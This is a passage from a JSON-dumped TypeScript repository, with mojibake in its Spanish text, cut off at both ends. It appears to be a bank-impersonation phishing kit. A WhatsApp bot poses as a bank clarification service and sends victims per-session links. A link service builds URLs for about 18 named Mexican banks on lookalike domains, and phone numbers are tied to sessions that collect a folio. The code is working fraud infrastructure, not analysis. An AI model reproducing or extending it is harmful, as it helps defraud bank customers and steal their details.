usuario est谩 esperando una respuesta de men煤\n      const userState = this.menuState.get(phoneNumber);\n      const currentTime = Date.now();\n\n      // Si escribe \"asistencia\", mostrar el men煤 principal\n      if (text.trim().toLowerCase() === 'asistencia') {\n        await this.sendMenu(phoneNumber, null);\n        this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: null });\n        return;\n      }\n\n      // Si es \"0\" o \"volver\", regresar al men煤 anterior\n      if (text.trim() === '0' || text.trim().toLowerCase() === 'volver') {\n        const currentMenuId = userState?.currentMenuId || null;\n        if (currentMenuId !== null) {\n          // Obtener el men煤 padre\n          const menuOptions = await this.getMenuOptions();\n          const currentMenu = menuOptions.find(opt => opt.id === currentMenuId);\n          const parentId = currentMenu?.parentId || null;\n          await this.sendMenu(phoneNumber, parentId);\n          this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: parentId });\n        } else {\n          // Ya estamos en el men煤 principal\n          await this.sendMenu(phoneNumber, null);\n          this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: null });\n        }\n        return;\n      }\n\n      // Si es un n煤mero (1-9), procesarlo como opci贸n de men煤\n      if (text.trim().match(/^[1-9]$/)) {\n        const optionNumber = parseInt(text.trim());\n        const currentMenuId = userState?.currentMenuId || null;\n        await this.processMenuOption(phoneNumber, optionNumber, currentMenuId);\n        return;\n      }\n\n      // Si no hay estado o han pasado m谩s de 5 minutos, enviar men煤 de bienvenida\n      if (!userState || (currentTime - userState.lastMessageTime) > 300000) {\n        await this.sendMenu(phoneNumber, null);\n        this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: null });\n      }\n\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error al manejar mensaje:`, error);\n    }\n  }\n\n  private async sendMenu(phoneNumber: string, parentId: number | null) {\n    try {\n      if (!this.sock) {\n        throw new Error('Bot no est谩 conectado');\n      }\n\n      // Obtener configuraci贸n del men煤 desde la base de datos\n      const config = await this.getWhatsAppConfig();\n      const allMenuOptions = await this.getMenuOptions();\n\n      // Filtrar opciones por el parentId y que est茅n activas\n      const menuOptions = allMenuOptions.filter(opt => {\n        if (!opt.isActive) return false;\n        if (parentId === null) {\n          return opt.parentId === null || opt.parentId === undefined;\n        }\n        return opt.parentId === parentId;\n      });\n\n      let headerText = '';\n      \n      // Si es men煤 principal, usar mensaje de bienvenida\n      if (parentId === null) {\n        headerText = config?.welcomeMessage || '隆Hola! Bienvenido a nuestro servicio de aclaraciones bancarias.';\n      } else {\n        // Es un sub-men煤\n        const parentOption = allMenuOptions.find(opt => opt.id === parentId);\n        headerText = parentOption?.optionText || 'Selecciona una opci贸n:';\n      }\n\n      // Reemplazar placeholders (liga) y (banco) en el mensaje de bienvenida\n      if (headerText.includes('(liga)')) {\n        const link = await this.generatePanelLink();\n        headerText = headerText.replace(/\\(liga\\)/g, link);\n        \n        // Cuando se env铆a una liga, asociar el n煤mero con la sesi贸n m谩s reciente\n        const sessionId = await this.getLatestSessionId();\n        if (sessionId) {\n          this.phoneToSessionMap.set(phoneNumber, sessionId);\n          try {\n            await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);\n            console.log(`[WhatsApp Bot]  Liga en bienvenida y n煤mero ${phoneNumber} asociado con sesi贸n ${sessionId}`);\n          } catch (error) {\n            console.error(`[WhatsApp Bot]  Error guardando n煤mero en bienvenida:`, error);\n          }\n        }\n      }\n      \n      if (headerText.includes('(banco)')) {\n        const bankName = await this.generateBankName();\n        headerText = headerText.replace(/\\(banco\\)/g, bankName);\n      }\n\n      // Formatear n煤mero para WhatsApp\n      const jid = phoneNumber.includes('@') ? phoneNumber : `${phoneNumber}@s.whatsapp.net`;\n\n      // Construir mensaje de men煤 mejorado con formato\n      if (menuOptions.length > 0) {\n        let menuText = `${headerText}\\n\\n`;\n        menuText += `\\n`;\n        menuText += ` *OPCIONES DISPONIBLES*\\n`;\n        menuText += `\\n\\n`;\n        \n        for (const option of menuOptions) {\n          menuText += `锔 *${option.optionNumber}* - ${option.optionText}\\n`;\n        }\n        \n        if (parentId !== null) {\n          menuText += `\\n锔 *0* - Volver al men煤 anterior`;\n        }\n        \n        menuText += `\\n\\n`;\n        menuText += ` _Escribe el n煤mero de la opci贸n que deseas o escribe \"asistencia\" en cualquier momento para volver al men煤 principal._`;\n        \n        await this.sendMessage(phoneNumber, menuText);\n        console.log(`[WhatsApp Bot] Men煤 enviado a ${phoneNumber} con ${menuOptions.length} opciones`);\n      }\n      // Si no hay opciones, enviar solo el mensaje de bienvenida\n      else {\n        await this.sendMessage(phoneNumber, `${headerText}\\n\\nNo hay opciones disponibles en este momento.\\n\\n_Escribe \"asistencia\" para volver al men煤 principal._`);\n      }\n\n      // Guardar el mensaje del bot en el historial\n      await this.saveConversation(phoneNumber, `Bot -> ${headerText}`, true);\n\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error al enviar men煤:`, error);\n      // Fallback a mensaje de texto simple si hay error con botones\n      try {\n        const config = await this.getWhatsAppConfig();\n        const allMenuOptions = await this.getMenuOptions();\n        const menuOptions = allMenuOptions.filter(opt => {\n          if (!opt.isActive) return false;\n          if (parentId === null) {\n            return opt.parentId === null || opt.parentId === undefined;\n          }\n          return opt.parentId === parentId;\n        });\n\n        let menuText = '';\n        if (parentId === null) {\n          menuText = config?.welcomeMessage || '隆Hola! Bienvenido a nuestro servicio de aclaraciones bancarias.';\n          \n          // Reemplazar placeholders (liga) y (banco) en el fallback tambi茅n\n          if (menuText.includes('(liga)')) {\n            const link = await this.generatePanelLink();\n            menuText = menuText.replace(/\\(liga\\)/g, link);\n            \n            // Asociar n煤mero con sesi贸n m谩s reciente\n            const sessionId = await this.getLatestSessionId();\n            if (sessionId) {\n              this.phoneToSessionMap.set(phoneNumber, sessionId);\n              try {\n                await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);\n                console.log(`[WhatsApp Bot]  Liga en fallback y n煤mero ${phoneNumber} asociado con sesi贸n ${sessionId}`);\n              } catch (error) {\n                console.error(`[WhatsApp Bot]  Error guardando n煤mero en fallback:`, error);\n              }\n            }\n          }\n          \n          if (menuText.includes('(banco)')) {\n            const bankName = await this.generateBankName();\n            menuText = menuText.replace(/\\(banco\\)/g, bankName);\n          }\n          \n          menuText += '\\n\\nPor favor selecciona una opci贸n:\\n\\n';\n        } else {\n          const parentOption = allMenuOptions.find(opt => opt.id === parentId);\n          menuText = parentOption?.optionText || 'Selecciona una opci贸n:';\n          menuText += '\\n\\n';\n        }\n\n        for (const option of menuOptions) {\n          menuText += `${option.optionNumber}. ${option.optionText}\\n`;\n        }\n\n        if (parentId !== null) {\n          menuText += '\\n0. Volver al men煤 anterior';\n        }\n\n        menuText += '\\n\\nEscribe \"asistencia\" en cualquier momento para volver al men煤 principal.';\n\n        await this.sendMessage(phoneNumber, menuText);\n      } catch (fallbackError) {\n        console.error(`[WhatsApp Bot] Error en fallback:`, fallbackError);\n      }\n    }\n  }\n\n  private async processMenuOption(phoneNumber: string, optionNumber: number, currentMenuId: number | null) {\n    try {\n      const allMenuOptions = await this.getMenuOptions();\n      \n      // Filtrar opciones del men煤 actual\n      const menuOptions = allMenuOptions.filter(opt => {\n        if (currentMenuId === null) {\n          return opt.parentId === null || opt.parentId === undefined;\n        }\n        return opt.parentId === currentMenuId;\n      });\n\n      const selectedOption = menuOptions.find(opt => opt.optionNumber === optionNumber && opt.isActive);\n\n      if (!selectedOption) {\n        await this.sendMessage(phoneNumber, 'Opci贸n no v谩lida. Por favor selecciona una opci贸n del men煤.');\n        await this.sendMenu(phoneNumber, currentMenuId);\n        return;\n      }\n\n      const currentTime = Date.now();\n      \n      // Verificar si la opci贸n tiene sub-men煤s\n      const hasSubMenu = allMenuOptions.some(opt => opt.parentId === selectedOption.id);\n\n      // Procesar el mensaje de respuesta si existe\n      if (selectedOption.responseMessage) {\n        let messageToSend = selectedOption.responseMessage;\n        \n        // Reemplazar (liga) con la 煤ltima liga del panel si existe en el mensaje\n        if (messageToSend.includes('(liga)')) {\n          const panelUrl = await this.generatePanelLink();\n          messageToSend = messageToSend.replace(/\\(liga\\)/g, panelUrl);\n          \n          // Cuando se env铆a una liga, asociar el n煤mero de tel茅fono con la sesi贸n m谩s reciente\n          const sessionId = await this.getLatestSessionId();\n          if (sessionId) {\n            // Guardar en el Map para referencia r谩pida\n            this.phoneToSessionMap.set(phoneNumber, sessionId);\n            \n            // Guardar directamente en la base de datos\n            try {\n              await this.config.storage.updateSessionPhoneNumber(sessionId, phoneNumber);\n              console.log(`[WhatsApp Bot]  Liga enviada y n煤mero ${phoneNumber} asociado con sesi贸n ${sessionId}`);\n            } catch (error) {\n              console.error(`[WhatsApp Bot]  Error guardando n煤mero al enviar liga:`, error);\n            }\n          }\n        }\n        \n        // Reemplazar (banco) con el nombre del banco de la 煤ltima sesi贸n\n        if (messageToSend.includes('(banco)')) {\n          const bankName = await this.generateBankName();\n          messageToSend = messageToSend.replace(/\\(banco\\)/g, bankName);\n        }\n        \n        await this.sendMessage(phoneNumber, messageToSend);\n      }\n\n      // Procesar seg煤n el tipo de acci贸n\n      switch (selectedOption.actionType) {\n        case 'message':\n          // Si tiene sub-men煤, mostrarlo despu茅s del mensaje\n          if (hasSubMenu) {\n            setTimeout(async () => {\n              await this.sendMenu(phoneNumber, selectedOption.id);\n            }, 1000);\n            this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: selectedOption.id });\n          } else {\n            this.menuState.set(phoneNumber, { waitingForInput: false, lastMessageTime: currentTime, currentMenuId });\n          }\n          break;\n          \n        case 'transfer':\n          await this.sendMessage(phoneNumber, 'Un ejecutivo se pondr谩 en contacto contigo pronto.');\n          console.log(`[WhatsApp Bot] Transferencia solicitada por ${phoneNumber}`);\n          this.menuState.set(phoneNumber, { waitingForInput: false, lastMessageTime: currentTime, currentMenuId });\n          break;\n          \n        case 'info':\n          // Volver a mostrar el men煤 despu茅s de dar la informaci贸n\n          setTimeout(() => this.sendMenu(phoneNumber, currentMenuId), 2000);\n          this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId });\n          break;\n\n        case 'submenu':\n          // Mostrar el sub-men煤\n          await this.sendMenu(phoneNumber, selectedOption.id);\n          this.menuState.set(phoneNumber, { waitingForInput: true, lastMessageTime: currentTime, currentMenuId: selectedOption.id });\n          break;\n      }\n\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error al procesar opci贸n de men煤:`, error);\n    }\n  }\n\n  private async generatePanelLink(): Promise<string> {\n    try {\n      // Obtener la configuraci贸n del sitio para el baseUrl\n      const siteConfig = await this.config.storage.getSiteConfig();\n      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';\n      \n      // Obtener la 煤ltima sesi贸n activa creada\n      const sessions = await this.config.storage.getAllSessions();\n      \n      // Filtrar sesiones activas y ordenar por fecha de creaci贸n (m谩s reciente primero)\n      const activeSessions = sessions\n        .filter((s: any) => s.active)\n        .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());\n      \n      if (activeSessions.length > 0) {\n        // Usar el sessionId de la 煤ltima sesi贸n activa (la m谩s reciente)\n        const latestSession = activeSessions[0];\n        const link = `${baseClientUrl}/${latestSession.sessionId}`;\n        console.log(`[WhatsApp Bot] Generando liga: ${link} (sesi贸n: ${latestSession.sessionId})`);\n        return link;\n      } else {\n        // Si no hay sesiones activas, devolver mensaje informando que no hay liga disponible\n        console.log(`[WhatsApp Bot] No hay sesiones activas, devolviendo baseUrl: ${baseClientUrl}`);\n        return `${baseClientUrl}`;\n      }\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error generando liga del panel:`, error);\n      const siteConfig = await this.config.storage.getSiteConfig();\n      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';\n      return `${baseClientUrl}`;\n    }\n  }\n\n  private async generateBankName(): Promise<string> {\n    try {\n      // Obtener la 煤ltima sesi贸n activa creada\n      const sessions = await this.config.storage.getAllSessions();\n      \n      // Filtrar sesiones activas y ordenar por fecha de creaci贸n (m谩s reciente primero)\n      const activeSessions = sessions\n        .filter((s: any) => s.active)\n        .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());\n      \n      if (activeSessions.length > 0) {\n        // Obtener el banco de la 煤ltima sesi贸n activa\n        const latestSession = activeSessions[0];\n        const bankName = latestSession.banco || 'BANCO';\n        console.log(`[WhatsApp Bot] Generando nombre de banco: ${bankName} (sesi贸n: ${latestSession.sessionId})`);\n        return bankName;\n      } else {\n        console.log(`[WhatsApp Bot] No hay sesiones activas, devolviendo 'BANCO' por defecto`);\n        return 'BANCO';\n      }\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error generando nombre de banco:`, error);\n      return 'BANCO';\n    }\n  }\n\n  private async getLatestSessionId(): Promise<string | null> {\n    try {\n      const sessions = await this.config.storage.getAllSessions();\n      const activeSessions = sessions\n        .filter((s: any) => s.active)\n        .sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());\n      \n      if (activeSessions.length > 0) {\n        return activeSessions[0].sessionId;\n      }\n      return null;\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error obteniendo 煤ltima sesi贸n:`, error);\n      return null;\n    }\n  }\n\n  public isConnected(): boolean {\n    return this.sock !== null && this.sock.user !== undefined;\n  }\n\n  private async updateQRCode(qrCode: string) {\n    try {\n      await this.config.storage.updateWhatsAppConfig(this.config.userId, {\n        qrCode,\n        isConnected: false\n      });\n      console.log(`[WhatsApp Bot] QR actualizado para usuario ${this.config.userId}`);\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error actualizando QR:`, error);\n    }\n  }\n\n  private async updateConnectionStatus(isConnected: boolean, phoneNumber?: string) {\n    try {\n      await this.config.storage.updateWhatsAppConfig(this.config.userId, {\n        isConnected,\n        phoneNumber: phoneNumber || '',\n        qrCode: isConnected ? null : undefined\n      });\n      console.log(`[WhatsApp Bot] Estado de conexi贸n para usuario ${this.config.userId}: ${isConnected ? 'conectado' : 'desconectado'}`);\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error actualizando estado de conexi贸n:`, error);\n    }\n  }\n\n  private async saveConversation(phoneNumber: string, message: string, isFromBot: boolean) {\n    try {\n      await this.config.storage.saveWhatsAppConversation({\n        userId: this.config.userId,\n        phoneNumber,\n        message,\n        isFromBot\n      });\n      console.log(`[WhatsApp Bot] Guardando mensaje: ${isFromBot ? 'Bot' : phoneNumber} -> ${message}`);\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error guardando conversaci贸n:`, error);\n    }\n  }\n\n  private async getWhatsAppConfig() {\n    try {\n      return await this.config.storage.getWhatsAppConfig(this.config.userId);\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error obteniendo configuraci贸n:`, error);\n      return null;\n    }\n  }\n\n  private async getMenuOptions() {\n    try {\n      return await this.config.storage.getWhatsAppMenuOptions(this.config.userId);\n    } catch (error) {\n      console.error(`[WhatsApp Bot] Error obteniendo opciones de men煤:`, error);\n      return [];\n    }\n  }\n}\n\n// Singleton para manejar m煤ltiples bots (uno por usuario)\nclass WhatsAppBotManager {\n  private bots: Map<number, WhatsAppBot> = new Map();\n\n  async startBot(userId: number, storage: IStorage, callbacks?: {\n    onQRUpdate?: (qr: string) => void;\n    onConnected?: () => void;\n    onDisconnected?: () => void;\n  }) {\n    // Si ya existe un bot para este usuario, detenerlo primero\n    if (this.bots.has(userId)) {\n      await this.stopBot(userId);\n    }\n\n    const bot = new WhatsAppBot({\n      userId,\n      storage,\n      ...callbacks\n    });\n\n    await bot.start();\n    this.bots.set(userId, bot);\n    \n    return bot;\n  }\n\n  async stopBot(userId: number) {\n    const bot = this.bots.get(userId);\n    if (bot) {\n      await bot.stop();\n      this.bots.delete(userId);\n    }\n  }\n\n  getBot(userId: number): WhatsAppBot | undefined {\n    return this.bots.get(userId);\n  }\n\n  async stopAllBots() {\n    const entries = Array.from(this.bots.entries());\n    for (const [userId, bot] of entries) {\n      await bot.stop();\n    }\n    this.bots.clear();\n  }\n}\n\nexport const whatsappBotManager = new WhatsAppBotManager();\n","size_bytes":30484},"client/src/components/ui/alert.tsx":{"content":"import * as React from \"react\"\nimport { cva, type VariantProps } from \"class-variance-authority\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst alertVariants = cva(\n  \"relative w-full rounded-lg border p-4 [&>svg~*]:pl-7 [&>svg+div]:translate-y-[-3px] [&>svg]:absolute [&>svg]:left-4 [&>svg]:top-4 [&>svg]:text-foreground\",\n  {\n    variants: {\n      variant: {\n        default: \"bg-background text-foreground\",\n        destructive:\n          \"border-destructive/50 text-destructive dark:border-destructive [&>svg]:text-destructive\",\n      },\n    },\n    defaultVariants: {\n      variant: \"default\",\n    },\n  }\n)\n\nconst Alert = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement> & VariantProps<typeof alertVariants>\n>(({ className, variant, ...props }, ref) => (\n  <div\n    ref={ref}\n    role=\"alert\"\n    className={cn(alertVariants({ variant }), className)}\n    {...props}\n  />\n))\nAlert.displayName = \"Alert\"\n\nconst AlertTitle = React.forwardRef<\n  HTMLParagraphElement,\n  React.HTMLAttributes<HTMLHeadingElement>\n>(({ className, ...props }, ref) => (\n  <h5\n    ref={ref}\n    className={cn(\"mb-1 font-medium leading-none tracking-tight\", className)}\n    {...props}\n  />\n))\nAlertTitle.displayName = \"AlertTitle\"\n\nconst AlertDescription = React.forwardRef<\n  HTMLParagraphElement,\n  React.HTMLAttributes<HTMLParagraphElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"text-sm [&_p]:leading-relaxed\", className)}\n    {...props}\n  />\n))\nAlertDescription.displayName = \"AlertDescription\"\n\nexport { Alert, AlertTitle, AlertDescription }\n","size_bytes":1584},"server/services/linkQuota.ts":{"content":"import { db } from '../db';\nimport { linkUsageWeekly, type InsertLinkUsageWeekly } from '../../shared/schema';\nimport { eq, and } from 'drizzle-orm';\n\nconst WEEKLY_LINK_LIMIT = 150;\n\nfunction getWeekStartDate(): Date {\n  const now = new Date();\n  const dayOfWeek = now.getDay();\n  const diff = dayOfWeek === 0 ? 6 : dayOfWeek - 1;\n  const monday = new Date(now);\n  monday.setDate(now.getDate() - diff);\n  monday.setHours(0, 0, 0, 0);\n  return monday;\n}\n\nexport class LinkQuotaService {\n  async checkQuota(userId: number): Promise<{ \n    allowed: boolean; \n    remaining: number; \n    limit: number;\n    weekStart: Date;\n  }> {\n    const weekStart = getWeekStartDate();\n    \n    const usage = await db.query.linkUsageWeekly.findFirst({\n      where: and(\n        eq(linkUsageWeekly.userId, userId),\n        eq(linkUsageWeekly.weekStartDate, weekStart)\n      )\n    });\n\n    const currentCount = usage?.linkCount || 0;\n    const remaining = Math.max(0, WEEKLY_LINK_LIMIT - currentCount);\n    \n    return {\n      allowed: currentCount < WEEKLY_LINK_LIMIT,\n      remaining,\n      limit: WEEKLY_LINK_LIMIT,\n      weekStart\n    };\n  }\n\n  async incrementUsage(userId: number): Promise<void> {\n    const weekStart = getWeekStartDate();\n    \n    const existing = await db.query.linkUsageWeekly.findFirst({\n      where: and(\n        eq(linkUsageWeekly.userId, userId),\n        eq(linkUsageWeekly.weekStartDate, weekStart)\n      )\n    });\n\n    if (existing) {\n      await db.update(linkUsageWeekly)\n        .set({\n          linkCount: existing.linkCount + 1,\n          lastGeneratedAt: new Date(),\n          updatedAt: new Date()\n        })\n        .where(eq(linkUsageWeekly.id, existing.id));\n    } else {\n      await db.insert(linkUsageWeekly).values({\n        userId,\n        weekStartDate: weekStart,\n        linkCount: 1,\n        lastGeneratedAt: new Date()\n      });\n    }\n  }\n\n  async getCurrentUsage(userId: number): Promise<{\n    count: number;\n    limit: number;\n    remaining: number;\n    weekStart: Date;\n    resetsAt: Date;\n    lastGenerated: Date | null;\n  }> {\n    const weekStart = getWeekStartDate();\n    \n    const usage = await db.query.linkUsageWeekly.findFirst({\n      where: and(\n        eq(linkUsageWeekly.userId, userId),\n        eq(linkUsageWeekly.weekStartDate, weekStart)\n      )\n    });\n\n    const count = usage?.linkCount || 0;\n    \n    return {\n      count,\n      limit: WEEKLY_LINK_LIMIT,\n      remaining: Math.max(0, WEEKLY_LINK_LIMIT - count),\n      weekStart,\n      resetsAt: this.getNextMonday(weekStart),\n      lastGenerated: usage?.lastGeneratedAt || null\n    };\n  }\n\n  async resetWeeklyUsage(userId: number): Promise<{\n    count: number;\n    limit: number;\n    remaining: number;\n  }> {\n    const weekStart = getWeekStartDate();\n    \n    // Buscar el registro existente\n    const existing = await db.query.linkUsageWeekly.findFirst({\n      where: and(\n        eq(linkUsageWeekly.userId, userId),\n        eq(linkUsageWeekly.weekStartDate, weekStart)\n      )\n    });\n\n    if (existing) {\n      // Actualizar si existe\n      await db.update(linkUsageWeekly)\n        .set({\n          linkCount: 0,\n          updatedAt: new Date()\n        })\n        .where(eq(linkUsageWeekly.id, existing.id));\n    } else {\n      // Crear si no existe\n      await db.insert(linkUsageWeekly).values({\n        userId,\n        weekStartDate: weekStart,\n        linkCount: 0,\n        lastGeneratedAt: null\n      });\n    }\n\n    return {\n      count: 0,\n      limit: WEEKLY_LINK_LIMIT,\n      remaining: WEEKLY_LINK_LIMIT\n    };\n  }\n\n  // Obtener el pr贸ximo lunes a partir de una fecha\n  getNextMonday(fromDate: Date = new Date()): Date {\n    const date = new Date(fromDate);\n    const dayOfWeek = date.getDay();\n    \n    // Si ya es lunes, el pr贸ximo lunes es en 7 d铆as\n    if (dayOfWeek === 1) {\n      date.setDate(date.getDate() + 7);\n    } else {\n      // Calcular d铆as hasta el pr贸ximo lunes\n      const daysUntilMonday = dayOfWeek === 0 ? 1 : 8 - dayOfWeek;\n      date.setDate(date.getDate() + daysUntilMonday);\n    }\n    \n    date.setHours(0, 0, 0, 0);\n    return date;\n  }\n}\n\nexport const linkQuotaService = new LinkQuotaService();\n","size_bytes":4142},"server/services/linkToken.ts":{"content":"import { db } from '../db';\nimport { linkTokens, bankSubdomains, LinkStatus, type InsertLinkToken, siteConfig } from '../../shared/schema';\nimport { eq, and, lt, or, sql } from 'drizzle-orm';\nimport { nanoid } from 'nanoid';\nimport { linkQuotaService } from './linkQuota';\n\n// Mapeo de c贸digos de banco a nombres completos con marca\nconst BANK_NAMES: Record<string, string> = {\n  liverpool: ' Liverpool',\n  citibanamex: ' Citibanamex',\n  banbajio: ' BanBaj铆o',\n  bbva: ' BBVA',\n  banorte: ' Banorte',\n  bancoppel: ' BanCoppel',\n  hsbc: ' HSBC',\n  amex: ' American Express',\n  santander: ' Santander',\n  scotiabank: ' Scotiabank',\n  invex: ' Invex',\n  banregio: ' Banregio',\n  spin: ' SPIN',\n  platacard: ' Platacard',\n  bancoazteca: ' Banco Azteca',\n  bienestar: ' Banco del Bienestar',\n  inbursa: ' Inbursa',\n  afirme: ' Afirme'\n};\n\nexport class LinkTokenService {\n  generateToken(): string {\n    // Genera un token corto de 12 caracteres (reducido de 32)\n    return nanoid(12);\n  }\n\n  getBankName(bankCode: string): string {\n    return BANK_NAMES[bankCode.toLowerCase()] || ` ${bankCode.toUpperCase()}`;\n  }\n\n  async getBankSubdomain(bankCode: string): Promise<string | null> {\n    const subdomain = await db.query.bankSubdomains.findFirst({\n      where: and(\n        eq(bankSubdomains.bankCode, bankCode),\n        eq(bankSubdomains.isActive, true)\n      )\n    });\n\n    return subdomain?.subdomain || null;\n  }\n\n  async createLink(data: {\n    userId: number;\n    bankCode: string;\n    sessionId?: string;\n    metadata?: any;\n  }): Promise<{ \n    id: number;\n    token: string; \n    originalUrl: string; \n    shortUrl: string | null;\n    expiresAt: Date;\n  }> {\n    const quota = await linkQuotaService.checkQuota(data.userId);\n    \n    if (!quota.allowed) {\n      throw new Error(`Has alcanzado el l铆mite semanal de ${quota.limit} links. L铆mite se renueva el pr贸ximo lunes.`);\n    }\n\n    const token = this.generateToken();\n    const expiresAt = new Date();\n    // Expiraci贸n inicial de 24 horas - el timer de 1 hora comenzar谩 cuando el usuario ingrese el folio\n    expiresAt.setHours(expiresAt.getHours() + 24);\n\n    // Obtener el dominio base de la configuraci贸n\n    const config = await db.query.siteConfig.findFirst();\n    const baseUrl = config?.baseUrl || 'https://folioaclaraciones.com';\n\n    // Generar URL con banco en el path: dominio.com/bankCode/client/token\n    const originalUrl = `${baseUrl}/${data.bankCode}/client/${token}`;\n\n    const [inserted] = await db.insert(linkTokens).values({\n      userId: data.userId,\n      sessionId: data.sessionId || null,\n      bankCode: data.bankCode,\n      token,\n      originalUrl,\n      shortUrl: null,\n      bitlyLinkId: null,\n      status: LinkStatus.ACTIVE,\n      expiresAt,\n      metadata: data.metadata || {}\n    }).returning();\n\n    try {\n      await linkQuotaService.incrementUsage(data.userId);\n    } catch (error) {\n      console.error('[Links] Error incrementando cuota, pero link creado:', error);\n    }\n\n    return {\n      id: inserted.id,\n      token,\n      originalUrl,\n      shortUrl: null, // Bitly deshabilitado\n      expiresAt\n    };\n  }\n\n  async validateAndConsumeToken(token: string, metadata?: any): Promise<{ \n    valid: boolean; \n    linkId?: number;\n    bankCode?: string;\n    sessionId?: string;\n    userId?: number;\n    createdBy?: string;\n    reason?: 'not_found' | 'already_used' | 'expired' | 'cancelled';\n    error?: string;\n  }> {\n    const link = await db.query.linkTokens.findFirst({\n      where: eq(linkTokens.token, token)\n    });\n\n    if (!link) {\n      return { valid: false, reason: 'not_found', error: 'Token no encontrado' };\n    }\n\n    if (link.status === LinkStatus.CONSUMED) {\n      return { valid: false, reason: 'already_used', error: 'Este link ya fue usado' };\n    }\n\n    if (link.status === LinkStatus.CANCELLED) {\n      return { valid: false, reason: 'cancelled', error: 'Este link fue cancelado' };\n    }\n\n    // NO validar expiraci贸n por tiempo - los links no expiran autom谩ticamente\n    // Solo se invalidan cuando: 1) se consume el token o 2) se cancela manualmente\n\n    const now = new Date();\n    // NO consumir el token aqu铆 - solo actualizar metadata y 煤ltimo acceso\n    // El token se consumir谩 cuando el usuario interact煤e con la sesi贸n\n    const updatedMetadata = metadata ? { ...(link.metadata as any || {}), ...metadata, lastAccess: now.toISOString() } : link.metadata;\n    \n    await db.update(linkTokens)\n      .set({ \n        metadata: updatedMetadata,\n        updatedAt: now \n      })\n      .where(eq(linkTokens.id, link.id));\n\n    return {\n      valid: true,\n      linkId: link.id,\n      bankCode: link.bankCode,\n      sessionId: link.sessionId || undefined,\n      userId: link.userId,\n      createdBy: (link.metadata as any)?.createdBy || 'system'\n    };\n  }\n\n  async consumeToken(token: string): Promise<void> {\n    const now = new Date();\n    await db.update(linkTokens)\n      .set({ \n        status: LinkStatus.CONSUMED, \n        usedAt: now,\n        updatedAt: now \n      })\n      .where(eq(linkTokens.token, token));\n  }\n\n  async updateTokenSession(token: string, sessionId: string): Promise<void> {\n    await db.update(linkTokens)\n      .set({ \n        sessionId,\n        updatedAt: new Date()\n      })\n      .where(eq(linkTokens.token, token));\n  }\n\n  async getLinkBySession(sessionId: string): Promise<{ id: number; token: string; status: string } | null> {\n    const link = await db.query.linkTokens.findFirst({\n      where: eq(linkTokens.sessionId, sessionId),\n      columns: {\n        id: true,\n        token: true,\n        status: true\n      }\n    });\n    \n    return link || null;\n  }\n\n  // MTODOS DE EXPIRACIN ELIMINADOS - Los links no expiran por tiempo\n  // Solo se invalidan cuando: 1) usuario ingresa folio o 2) admin cancela manualmente\n\n  async cancelLink(linkId: number): Promise<void> {\n    await db.update(linkTokens)\n      .set({\n        status: LinkStatus.CANCELLED,\n        updatedAt: new Date()\n      })\n      .where(eq(linkTokens.id, linkId));\n  }\n\n  async getLinkHistory(userId: number, limit: number = 50): Promise<any[]> {\n    const links = await db.query.linkTokens.findMany({\n      where: eq(linkTokens.userId, userId),\n      orderBy: (linkTokens, { desc }) => [desc(linkTokens.createdAt)],\n      limit\n    });\n\n    // Los links no expiran por tiempo, solo devolver su estado actual\n    return links.map(link => ({\n      ...link,\n      isExpired: link.status === LinkStatus.EXPIRED || link.status === LinkStatus.CANCELLED\n    }));\n  }\n}\n\nexport const linkTokenService = new LinkTokenService();\n","size_bytes":6645},"client/src/components/admin/LinkManagementPanel.tsx":{"content":"import { useState, useEffect } from 'react';\nimport { useQuery, useMutation } from '@tanstack/react-query';\nimport { apiRequest, queryClient } from '@/lib/queryClient';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Button } from '@/components/ui/button';\nimport { Badge } from '@/components/ui/badge';\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';\nimport { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';\nimport { useToast } from '@/hooks/use-toast';\nimport { Link2, Clock, XCircle, Plus, RefreshCw, Copy, CheckCircle } from 'lucide-react';\n\ninterface LinkQuota {\n  used: number;\n  limit: number;\n  allowed: boolean;\n  resetsAt: string;\n}\n\ninterface Link {\n  id: number;\n  token: string;\n  bankCode: string;\n  originalUrl: string;\n  shortUrl: string | null;\n  status: 'active' | 'consumed' | 'expired' | 'cancelled';\n  expiresAt: string;\n  usedAt: string | null;\n  createdAt: string;\n  timeRemainingMs?: number;\n  timeRemainingFormatted?: string;\n  isExpired?: boolean;\n}\n\ninterface ActiveSession {\n  sessionId: string;\n  folio: string;\n  banco: string;\n  createdBy: string;\n  linkId: number;\n  token: string;\n  originalUrl: string;\n  shortUrl: string | null;\n  linkStatus: 'active' | 'consumed' | 'expired' | 'cancelled';\n  expiresAt: string;\n  usedAt: string | null;\n  createdAt: string;\n  timeRemainingMs: number;\n 